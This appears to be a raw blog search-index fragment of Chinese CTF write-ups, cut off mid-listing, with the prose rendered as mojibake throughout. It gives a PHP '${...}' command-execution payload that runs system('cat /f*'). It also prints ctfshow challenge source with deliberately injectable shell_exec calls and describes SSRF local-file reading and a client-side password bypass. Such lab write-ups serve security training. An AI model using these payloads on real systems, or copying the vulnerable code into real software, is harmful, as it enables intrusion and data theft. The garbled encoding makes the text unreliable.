class="line">                <span class="keyword">echo</span> <span class="string">&#x27;æœªæ£€æµ‹åˆ°å±é™©ä»£ç ï¼Œ&#x27;</span>.<span class="variable">$safe_word</span>.<span class="string">&#x27;ï¼Œéå¸¸å®‰å…¨&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&#x27;æ¬¢è¿ä½¿ç”¨gxngxngxnçš„æ¶æ„ä»£ç æ£€æµ‹å™¨ï¼ï¼ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼•å·æ²¡äº†ï¼Œæœ‰ä¸ªç‰¹æ€§å°±æ˜¯åˆ©ç”¨<code>&#123;&#125;</code>è¿›è¡ŒRCE</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:/public/index.php</span><br><span class="line">code=<span class="built_in">$</span>&#123;input(0)(input(1))&#125;<span class="built_in">&amp;</span>0=system<span class="built_in">&amp;</span>1=cat /f*</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨inputå‡½æ•°ç»•è¿‡å¼•å·ï¼Œç„¶åæ‹¿åˆ°flagï¼Œä½†æ˜¯å“ˆè¿™é‡Œ${}è¢«å•å¼•å·åŒ…è£¹çš„æ—¶å€™å°±ä¸èƒ½rceï¼Œè€Œæ˜¯è¢«å½“ä½œå­—é¢é‡ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è„æ•°æ® </tag>
            
            <tag> flaskå†…å­˜é©¬ </tag>
            
            <tag> phpç‰¹æ€§{}rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshowç»ˆæè€ƒæ ¸ï¼ˆæœªå®Œï¼‰</title>
      <link href="/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/"/>
      <url>/2025/11/05/ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬¬ä¸€æ¬¡æ¥è§¦è¿™å†…ç½‘æ¸—é€ï¼Œæ”¶è·è¿˜æ˜¯æŒºå¤šçš„ï¼å¯¹æ€è·¯çš„æå‡è¿˜æ˜¯å¾ˆä¸é”™çš„!ä¸‹é¢ä¸€èµ·æ¥å“é‰´ä¸€ä¸‹å§ï¼ç€é‡æ•´ä½“æ€è·¯çš„åˆ†æï¼Œæœ‰äº›ç»†èŠ‚å¯èƒ½ä¸ä¼šå»å†™ï¼</p><h2 id="ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨"><a href="#ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨" class="headerlink" title="ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨"></a>ä¿¡æ¯æ”¶é›†å’Œæ¼æ´åˆ©ç”¨</h2><p>æˆ‘ä»¬çš„ç›®æ ‡å…¶å®å°±æ˜¯å›´ç»•è¿™3ä¸ªæ ‡é¢˜å±•å¼€çš„</p><h3 id="index-php"><a href="#index-php" class="headerlink" title="&#x2F;index.php"></a>&#x2F;index.php</h3><p>æŠ“åŒ…å“åº”å¤´é‡Œé¢æœ‰ä¸ªflagï¼Œç›®å½•æ‰«ææ‰«å‡ºä¸ªsource.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¦Â·Â»Ã¥Å  Ã¦Ë†ÂÃ¥Å Å¸&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$data</span>.<span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;Ã§â€Â¨Ã¦Ë†Â·Ã¥Â·Â²Ã¥Â­ËœÃ¥Å“Â¨&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¦â€ºÂ´Ã¦â€“Â°Ã¦Ë†ÂÃ¥Å Å¸&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$username</span>.<span class="string">&#x27;@&#x27;</span>.<span class="variable">$password</span>.<span class="string">&#x27;|&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;Ã§â€Â¨Ã¦Ë†Â·Ã¤Â¸ÂÃ¥Â­ËœÃ¥Å“Â¨Ã¦Ë†â€“Ã¦â€” Ã¦ÂÆ’Ã¦â€ºÂ´Ã¦â€“Â°&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¥Ë† Ã©â„¢Â¤Ã¦Ë†ÂÃ¥Å Å¸&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">existsUser</span>(<span class="variable">$data</span>,<span class="variable">$username</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(DB_PATH, <span class="variable">$s</span>);</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;code&#x27;</span>]=-<span class="number">1</span>;</span><br><span class="line"><span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="string">&#x27;Ã§â€Â¨Ã¦Ë†Â·Ã¤Â¸ÂÃ¥Â­ËœÃ¥Å“Â¨Ã¦Ë†â€“Ã¦â€” Ã¦ÂÆ’Ã¥Ë† Ã©â„¢Â¤&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">existsUser</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;@[0-9a-zA-Z]+\|/&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>)?:<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>,<span class="string">&#x27;&lt;!-- ctfshow-web-cache --&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clearCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf cache.php&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">flushCache</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;cache.php&#x27;</span>) &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;cache.php&#x27;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> FLAG646;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">netTest</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;code&#x27;</span>=&gt;<span class="number">0</span>,</span><br><span class="line"><span class="string">&#x27;message&#x27;</span>=&gt;<span class="string">&#x27;Ã¥â€˜Â½Ã¤Â»Â¤Ã¦â€°Â§Ã¨Â¡Å’Ã¥Â¤Â±Ã¨Â´Â¥&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ping ((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z]+$/&#x27;</span>, <span class="variable">$cmd</span>))&#123;</span><br><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="title function_ invoke__">stripos</span>(PHP_OS,<span class="string">&#x27;WIN&#x27;</span>)!==<span class="literal">FALSE</span>?<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;GBK&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="variable">$res</span>):<span class="variable">$ret</span>[<span class="string">&#x27;message&#x27;</span>]=<span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¨æ˜¯ä¸€äº›å‡½æ•°ä¸çŸ¥é“æœ‰å•¥ç”¨ï¼</p><p>ç½‘é¡µæºç çš„cssè·¯å¾„æ³„éœ²äº†ç›®å½•ï¼<code>/system36d/</code>ã€‚è¿™ä¸ªé¡µé¢çš„åˆ©ç”¨ä»·å€¼å·²ç»æ²¡äº†ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªç¯èŠ‚</p><h3 id="system36d"><a href="#system36d" class="headerlink" title="&#x2F;system36d&#x2F;"></a>&#x2F;system36d&#x2F;</h3><p>è®¿é—®è¿™ä¸ªç›®å½•ï¼Œå‘ç°æœ‰é‡å®šå‘ï¼ŒæŠ“åŒ…åˆ†æï¼æ‹¿åˆ°web642çš„flag</p><p>ç„¶åæ˜¯ä¸ªå¯†ç é”ï¼Œå‘ç°åœ¨å°è¯•å¯†ç çš„æ—¶å€™æ— æ•°æ®åŒ…çš„å‘ç”Ÿï¼Œé‚£ä¹ˆå¤„ç†é€»è¾‘ä¸€å®šæ˜¯å‰ç«¯jsï¼Œæœç„¶å¯†ç æ˜¯<code>0x36D</code>ï¼Œå¹¶ä¸”æ‹¿åˆ°web644çš„flagï¼</p><p><img src="/images/achieve/2025/11/11.png"></p><p>æ¥åˆ°åå°ï¼Œä¸€å †åŠŸèƒ½æŒ¨ä¸ªå»è¯•ä¸€è¯•ï¼Œä½†æ˜¯é»‘ç›’ï¼Œè¿™é‡Œå…¶å®è¿˜å¯ä»¥é¡ºä¾¿å»æ‰«ä¸€ä¸‹è¿™ä¸ªç›®å½•ï¼</p><p>ç»“æœå¦‚ä¸‹ï¼š</p><ol><li>æ•°æ®å¤‡ä»½æ‹¿åˆ°web645çš„flag</li><li>è¿œç¨‹æ›´æ–°å‘ç°æœ‰ä¸ªssrfå¯ä»¥ç”¨æ¥è¯»æœ¬åœ°æ–‡ä»¶</li><li>ç½‘ç»œæµ‹è¯•å¯ä»¥æ‰§è¡Œä»…å­—æ¯rceï¼ˆls åˆ—å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰</li></ol><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">checklogin.php</span><br><span class="line">db/</span><br><span class="line">index.php</span><br><span class="line">init.php</span><br><span class="line">login.php</span><br><span class="line">logout.php</span><br><span class="line">main.php</span><br><span class="line">secret.txt</span><br><span class="line">static/</span><br><span class="line">update.php</span><br><span class="line">update2.php</span><br><span class="line">users.php</span><br><span class="line">util</span><br></pre></td></tr></table></figure><p>æŒ¨ä¸ªåˆ©ç”¨ssrfå»è¯»ï¼Œsecret.txtæ‹¿åˆ°web643çš„flag</p><p>users.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-07-26 10:25:59</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-08-01 01:52:58</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;init.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(DB_PATH);</span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable">$a</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">getUsers</span>(<span class="variable">$data</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;limit&#x27;</span>]));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;add&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">addUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;del&#x27;</span>:</span><br><span class="line"><span class="variable">$ret</span> = <span class="title function_ invoke__">delUser</span>(<span class="variable">$data</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;update&#x27;</span>:</span><br><span class="line"><span 